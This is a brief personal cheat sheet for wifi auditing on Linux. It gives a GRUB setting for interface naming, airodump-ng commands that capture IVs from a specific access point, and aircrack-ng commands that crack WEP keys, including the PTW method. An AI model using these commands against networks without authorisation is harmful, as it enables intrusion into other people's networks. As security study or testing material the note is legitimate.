# Notes on wifi configs and setup

## Keeping interface names
I was having issues with the external card until adjusting the below.
```bash
$ vim /etc/default/grub
GRUB_CMDLINE_LINUX="net.ifnames=0 biosdevname=0"
```

## airodump-ng
Find surrounding networks, access points and clients
```bash
$ airodump-ng wlan1
```

Begin collection on channel, BSSID and recording to file.

  -`-c`: Select channel number
  -`w`: Write to file
  --`bssid`: MAC address of access point
  -`--ivs`: Save only captured IVs

```bash
$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture  wlan1
```

## aircrack-ng

Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
```bash
$ aircrack-ng capture-01.ivs --bssid E0:05:C5:60:2E:65
```

Invoke PTW WEP cracking method method on an arp replay.
```bash
$ aircrack-ng -z replay_arp-0309-015802.cap
```
